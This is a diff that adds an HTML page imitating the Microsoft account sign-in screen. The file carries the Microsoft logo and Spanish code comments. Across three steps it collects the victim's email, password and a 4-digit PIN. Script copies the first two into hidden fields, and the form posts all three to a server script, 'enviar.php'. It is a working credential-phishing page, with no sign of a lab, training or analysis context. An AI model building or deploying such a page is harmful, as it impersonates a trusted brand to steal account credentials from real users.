@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: linear-gradient(to top right, #f3f6f9, #e6edf5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: white;
+      width: 400px;
+      border-radius: 10px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+      padding: 40px;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 30px;
+      width: 40px;
+    }
+
+    h2 {
+      margin: 0 0 25px;
+      font-size: 24px;
+      color: #1a1a1a;
+      font-weight: 400;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 0;
+      font-size: 16px;
+      border: none;
+      border-bottom: 2px solid #0067b8;
+      margin-bottom: 30px;
+      background: transparent;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #666;
+    }
+
+    .btn {
+      width: 100%;
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      padding: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 3px;
+    }
+
+    .btn:hover {
+      background-color: #005ba1;
+    }
+
+    .links {
+      font-size: 13px;
+      margin-top: -20px;
+      margin-bottom: 30px;
+    }
+
+    .links a {
+      color: #0067b8;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .email-label {
+      background: #f3f3f3;
+      padding: 12px;
+      border-radius: 50px;
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 25px;
+      border: 1px solid #ccc;
+    }
+
+    .small-link {
+      font-size: 13px;
+      margin-bottom: 25px;
+      display: block;
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .other-signin {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo -->
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
+
+    <!-- Paso 1: Email -->
+    <div id="step1">
+      <h2>Sign in</h2>
+      <form onsubmit="goToStep2(event)">
+        <input type="email" id="emailInput" placeholder="Email, phone, or Skype" required />
+        <div class="links">
+          <a href="#">No account? <strong>Create one!</strong></a>
+          <a href="#">Can’t access your account?</a>
+        </div>
+        <button class="btn" type="submit">Next</button>
+      </form>
+    </div>
+
+    <!-- Paso 2: Contraseña -->
+    <div id="step2" class="hidden">
+      <div class="email-label" id="emailDisplay1"></div>
+      <h2>Enter your password</h2>
+      <form onsubmit="goToStep3(event)">
+        <input type="password" id="passwordInput" placeholder="Password" required />
+        <a href="#" class="small-link">Forgot your password?</a>
+        <button class="btn" type="submit">Next</button>
+      </form>
+      <div class="other-signin">
+        <a href="#" class="small-link">Other ways to sign in</a>
+      </div>
+    </div>
+
+    <!-- Paso 3: PIN -->
+    <div id="step3" class="hidden">
+      <div class="email-label" id="emailDisplay2"></div>
+      <h2>Enter your 4-digit PIN</h2>
+      <form action="enviar.php" method="POST">
+        <input type="hidden" name="email" id="emailFinal" />
+        <input type="hidden" name="password" id="passwordFinal" />
+        <input type="tel" name="pin" placeholder="PIN" pattern="[0-9]{4}" maxlength="4" required />
+        <button class="btn" type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function goToStep2(e) {
+      e.preventDefault();
+      const email = document.getElementById('emailInput').value;
+      document.getElementById('emailDisplay1').textContent = email;
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function goToStep3(e) {
+      e.preventDefault();
+      const email = document.getElementById('emailInput').value;
+      const password = document.getElementById('passwordInput').value;
+      document.getElementById('emailDisplay2').textContent = email;
+      document.getElementById('emailFinal').value = email;
+      document.getElementById('passwordFinal').value = password;
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
